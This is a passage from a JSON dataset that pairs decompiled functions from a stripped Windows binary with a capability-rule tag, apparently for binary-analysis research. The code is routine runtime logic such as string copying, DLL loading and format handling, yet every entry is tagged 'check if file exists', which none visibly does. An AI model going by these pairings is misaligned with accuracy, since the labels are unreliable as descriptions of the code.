            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432c88(int32_t arg_8h)\n\n{\n    if (*0x6cae00 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.0043b3be(*0x6cae00);\n        }\n        fcn.0043b3f9(*0x6cae00, 0);\n        fcn.00432c6c(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0043b14d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043b14d(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        if (arg_8h == arg_ch) {\n            return 0;\n        }\n        piVar1 = *arg_8h * 4 + 0x6ccc4c;\n        iVar3 = *piVar1;\n        if (iVar3 == 0) {\n            iVar3 = fcn.0043b2fd(*(*arg_8h * 4 + 0x47e010));\n            if (iVar3 != 0) {\n                iVar2 = *piVar1;\n                *piVar1 = iVar3;\n                if (iVar2 == 0) {\n                    return iVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                return iVar3;\n            }\n            *piVar1 = -1;\n        }\n        else if (iVar3 != -1) {\n            return iVar3;\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 264
    },
    "0043b299": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043b299(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    do {\n        if (arg_ch == arg_10h) {\n            return 0;\n        }\n        piVar1 = *arg_ch * 4 + 0x6ccc4c;\n        iVar3 = *piVar1;\n        if (iVar3 == 0) {\n            iVar3 = fcn.0043b2fd(*(*arg_ch * 4 + 0x47e010));\n            if (iVar3 != 0) {\n                iVar2 = *piVar1;\n                *piVar1 = iVar3;\n                if (iVar2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar3);\n                }\n                goto code_r0x0043b2f1;\n            }\n            *piVar1 = -1;\n        }\n        else if (iVar3 != -1) {\ncode_r0x0043b2f1:\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, arg_8h);\n            return uVar4;\n        }\n        arg_ch = arg_ch + 1;\n    } while( true );\n}\n",
        "token_count": 304
    },
    "0043bf88": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043bf88(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uStack24;\n    int32_t var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0043bef3:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = 0;\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    var_4h = arg_14h;\n                    piVar3 = arg_8h;\n                    iVar4 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar3);\n                            *piVar3 = iVar1;\n                            piVar3 = piVar3 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            iVar1 = *((arg_10h - arg_8h) + piVar3);\n                            *piVar3 = iVar1;\n                            piVar3 = piVar3 + 1;\n                            if (iVar1 == 0) {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while ((iVar4 != 0) && (var_4h = var_4h + -1,  var_4h != 0));\n                        if (var_4h == 0) {\n                            *piVar3 = 0;\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = 0;\n                        return 0x50;\n                    }\n                    *arg_8h = 0;\n                    puVar2 = fcn.0043bcb5();\n                    uStack24 = 0x22;\n                    goto code_r0x0043bee0;\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0043bef3;\n    puVar2 = fcn.0043bcb5();\n    uStack24 = 0x16;\ncode_r0x0043bee0:\n    *puVar2 = uStack24;\n    fcn.0043bb3e();\n    return uStack24;\n}\n",
        "token_count": 647
    },
    "0043c04a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043c04a(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint uStack24;\n    int32_t var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0043bfcc:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    var_4h = arg_14h;\n                    pcVar3 = arg_8h;\n                    iVar4 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar3[arg_10h - arg_8h];\n                            *pcVar3 = cVar1;\n                            pcVar3 = pcVar3 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while (iVar4 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar3[arg_10h - arg_8h];\n                            *pcVar3 = cVar1;\n                            pcVar3 = pcVar3 + 1;\n                            if (cVar1 == '\\0') {\n                                return 0;\n                            }\n                            iVar4 = iVar4 + -1;\n                        } while ((iVar4 != 0) && (var_4h = var_4h + -1,  var_4h != 0));\n                        if (var_4h == 0) {\n                            *pcVar3 = '\\0';\n                        }\n                    }\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.0043bcb5();\n                    uStack24 = 0x22;\n                    goto code_r0x0043bfb9;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x0043bfcc;\n    puVar2 = fcn.0043bcb5();\n    uStack24 = 0x16;\ncode_r0x0043bfb9:\n    *puVar2 = uStack24;\n    fcn.0043bb3e();\n    return uStack24;\n}\n",
        "token_count": 645
    },
    "0043c8e2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0043c8e2(uint arg_8h, uint arg_ch, uchar *arg_10h, uint32_t arg_14h, uint32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, uint arg_24h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_1ch == 0) {\n        *(arg_20h + 0x1c) = 1;\n        *(arg_20h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n        return -1;\n    }\n    if (arg_18h == 0) {\n        if (arg_10h == NULL) {\n            if (arg_14h == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x0043c93d:\n            if (arg_14h != 0) {\n                uVar1 = *(arg_20h + 0x18);\n                uVar2 = *(arg_20h + 0x1c);\n                if (arg_18h < arg_14h) {\n                    iVar3 = fcn.0043caf5(arg_8h, arg_ch, arg_10h, arg_18h + 1, arg_1ch, arg_20h, arg_24h);\n                    if (iVar3 == -2) {\ncode_r0x0043c9a7:\n                        if (*(arg_20h + 0x1c) == '\\0') {\n                            return -1;\n                        }\n                        if (*(arg_20h + 0x18) != 0x22) {\n                            return -1;\n                        }\n                        *(arg_20h + 0x18) = uVar1;\n                        *(arg_20h + 0x1c) = uVar2;\n                        return -1;\n                    }\ncode_r0x0043c971:\n                    if (-1 < iVar3) {\n                        return iVar3;\n                    }\n                }\n                else {\n                    iVar3 = fcn.0043caf5(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, arg_24h);\n                    arg_10h[arg_14h - 1] = 0;\n                    if (iVar3 != -2) goto code_r0x0043c971;\n                    if (arg_18h == 0xffffffff) goto code_r0x0043c9a7;\n                }\n                *arg_10h = 0;\n                if (iVar3 != -2) {\n                    return -1;\n                }\n                *(arg_20h + 0x18) = 0x22;\n                goto code_r0x0043c9c9;\n            }\n        }\n    }\n    else if (arg_10h != NULL) goto code_r0x0043c93d;\n    *(arg_20h + 0x18) = 0x16;\ncode_r0x0043c9c9:\n    *(arg_20h + 0x1c) = 1;\n    fcn.0043bac1(0, 0, 0, 0, 0, arg_20h);\n    return -1;\n}\n",
        "token_count": 770
    },
    "00446a9b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446a9b(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.00454e8e(arg_ch, arg_14h, arg_18h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00446aca": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446aca(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    uint32_t unaff_EBX;\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_10h) {\n        do {\n            fcn.00454eb0(unaff_EBX & 0xffff0000 | arg_ch, arg_14h, arg_18h);\n            if (*arg_14h == -1) {\n                return;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00448561": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00448561(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0x30;\n    if (arg_8h < 0x30) goto code_r0x004486fd;\n    if (0x39 < arg_8h) {\n        iVar3 = 0xff10;\n        if (arg_8h < 0xff10) {\n            iVar3 = 0x660;\n            if (arg_8h < 0x660) goto code_r0x004486fd;\n            if (0x669 < arg_8h) {\n                iVar3 = 0x6f0;\n                if (arg_8h < 0x6f0) goto code_r0x004486fd;\n                if (0x6f9 < arg_8h) {\n                    iVar3 = 0x966;\n                    if (arg_8h < 0x966) goto code_r0x004486fd;\n                    if (0x96f < arg_8h) {\n                        iVar3 = 0x9e6;\n                        if (arg_8h < 0x9e6) goto code_r0x004486fd;\n                        if (0x9ef < arg_8h) {\n                            iVar3 = 0xa66;\n                            if (arg_8h < 0xa66) goto code_r0x004486fd;\n                            if (0xa6f < arg_8h) {\n                                iVar3 = 0xae6;\n                                if (arg_8h < 0xae6) goto code_r0x004486fd;\n                                if (0xaef < arg_8h) {\n                                    iVar3 = 0xb66;\n                                    if (arg_8h < 0xb66) goto code_r0x004486fd;\n                                    if (0xb6f < arg_8h) {\n                                        iVar3 = 0xc66;\n                                        if (arg_8h < 0xc66) goto code_r0x004486fd;\n                                        if (0xc6f < arg_8h) {\n                                            iVar3 = 0xce6;\n                                            if (arg_8h < 0xce6) goto code_r0x004486fd;\n                                            if (0xcef < arg_8h) {\n                                                iVar3 = 0xd66;\n                                                if (arg_8h < 0xd66) goto code_r0x004486fd;\n                                                if (0xd6f < arg_8h) {\n                                                    iVar3 = 0xe50;\n                                                    if (arg_8h < 0xe50) goto code_r0x004486fd;\n                                                    if (0xe59 < arg_8h) {\n                                                        iVar3 = 0xed0;\n                                                        if (arg_8h < 0xed0) goto code_r0x004486fd;\n                                                        if (0xed9 < arg_8h) {\n                                                            iVar3 = 0xf20;\n                                                            if (arg_8h < 0xf20) goto code_r0x004486fd;\n                                                            if (0xf29 < arg_8h) {\n                                                                iVar3 = 0x1040;\n                                                                if (arg_8h < 0x1040) goto code_r0x004486fd;\n                                                                if (0x1049 < arg_8h) {\n                                                                    iVar3 = 0x17e0;\n                                                                    if (arg_8h < 0x17e0) goto code_r0x004486fd;\n                                                                    if (0x17e9 < arg_8h) {\n                                                                        iVar3 = 0x1810;\n                                                                        if (arg_8h < 0x1810) goto code_r0x004486fd;\n                                                                        uVar2 = 0x181a;\n                                                                        goto code_r0x004486ea;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            uVar2 = 0xff1a;\ncode_r0x004486ea:\n            if (uVar2 <= arg_8h) goto code_r0x004486fd;\n        }\n    }\n    if (arg_8h - iVar3 != -1) {\n        return arg_8h - iVar3;\n    }\ncode_r0x004486fd:\n    uVar1 = arg_8h;\n    if (((uVar1 < 0x41) || (0x5a < uVar1)) && (0x19 < uVar1 - 0x61)) {\n        return -1;\n    }\n    if (uVar1 - 0x61 < 0x1a) {\n        uVar1 = uVar1 - 0x20;\n    }\n    return uVar1 - 0x37;\n}\n",
        "token_count": 1066
    },
    "00452e2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452e2c(uint *param_1)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    ppcVar1 = param_1[4];\n    param_1[4] = ppcVar1 + 1;\n    arg_ch = param_1[9];\n    arg_8h = *ppcVar1;\n    param_1[0xc] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.0045dadd(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h, arg_ch);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 348
    },
    "00452e9e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00452e9e(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.0043e875(param_1 + 0xc);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac12();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[9];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xc];\n            cVar1 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xc] = \"(null)\";\n                }\n                uVar2 = fcn.0045dadd(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x47e498;\n                    param_1[0xc] = 0x47e498;\n                }\n                *(param_1 + 0xe) = 1;\n                uVar2 = fcn.0045dd27(arg_8h, arg_ch);\n            }\n            param_1[0xd] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 368
    },
    "00452f1c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452f1c(uint *param_1)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    ppcVar1 = param_1[4];\n    param_1[4] = ppcVar1 + 1;\n    arg_ch = param_1[9];\n    arg_8h = *ppcVar1;\n    param_1[0xc] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.0045dadd(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h, arg_ch);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 348
    },
    "00452f8e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00452f8e(uint *param_1)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    ppcVar1 = param_1[4];\n    param_1[4] = ppcVar1 + 1;\n    arg_ch = param_1[9];\n    arg_8h = *ppcVar1;\n    param_1[0xc] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.0045dadd(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h, arg_ch);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 348
    },
    "00453000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00453000(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.0043e903(param_1 + 0xc);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac28();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[9];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xc];\n            cVar1 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xc] = \"(null)\";\n                }\n                uVar2 = fcn.0045dadd(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x47e498;\n                    param_1[0xc] = 0x47e498;\n                }\n                *(param_1 + 0xe) = 1;\n                uVar2 = fcn.0045dd27(arg_8h, arg_ch);\n            }\n            param_1[0xd] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 366
    },
    "0045307e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045307e(uint *param_1)\n\n{\n    char **ppcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    ppcVar1 = param_1[4];\n    param_1[4] = ppcVar1 + 1;\n    arg_ch = param_1[9];\n    arg_8h = *ppcVar1;\n    param_1[0xc] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff17(*param_1, param_1[1], *(param_1 + 0x2d), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.0045dadd(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h, arg_ch);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 347
    },
    "004530f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004530f0(uint *param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    piVar1 = param_1[4];\n    param_1[4] = piVar1 + 1;\n    arg_8h = param_1[9];\n    arg_8h_00 = *piVar1;\n    param_1[0xc] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.00453444(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h_00, arg_8h);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 359
    },
    "00453164": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00453164(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.0043e991(param_1 + 0xc);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac3e();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[9];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xc];\n            cVar1 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xc] = \"(null)\";\n                }\n                uVar2 = fcn.00453499(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x47e498;\n                    param_1[0xc] = 0x47e498;\n                }\n                *(param_1 + 0xe) = 1;\n                uVar2 = fcn.0045dd27(arg_8h, arg_8h_00);\n            }\n            param_1[0xd] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 379
    },
    "004531e4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004531e4(uint *param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    piVar1 = param_1[4];\n    param_1[4] = piVar1 + 1;\n    arg_8h = param_1[9];\n    arg_8h_00 = *piVar1;\n    param_1[0xc] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.004534ee(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h_00, arg_8h);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 359
    },
    "00453258": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00453258(uint *param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    piVar1 = param_1[4];\n    param_1[4] = piVar1 + 1;\n    arg_8h = param_1[9];\n    arg_8h_00 = *piVar1;\n    param_1[0xc] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.00453543(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h_00, arg_8h);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 358
    },
    "004532cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004532cc(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.0043ea20(param_1 + 0xc);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044ac54();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[9];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xc];\n            cVar1 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xc] = \"(null)\";\n                }\n                uVar2 = fcn.00453598(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x47e498;\n                    param_1[0xc] = 0x47e498;\n                }\n                *(param_1 + 0xe) = 1;\n                uVar2 = fcn.0045dd27(arg_8h, arg_8h_00);\n            }\n            param_1[0xd] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 378
    },
    "0045334c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045334c(uint *param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    piVar1 = param_1[4];\n    param_1[4] = piVar1 + 1;\n    arg_8h = param_1[9];\n    arg_8h_00 = *piVar1;\n    param_1[0xc] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar2 = fcn.0043ff48(*param_1, param_1[1], *(param_1 + 0x2e), param_1[10]);\n    if (cVar2 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xc] = \"(null)\";\n        }\n        uVar3 = fcn.004535ed(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x47e498;\n            param_1[0xc] = 0x47e498;\n        }\n        *(param_1 + 0xe) = 1;\n        uVar3 = fcn.0045dd27(arg_8h_00, arg_8h);\n    }\n    param_1[0xd] = uVar3;\n    return 1;\n}\n",
        "token_count": 359
    },
    "0045cc6f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
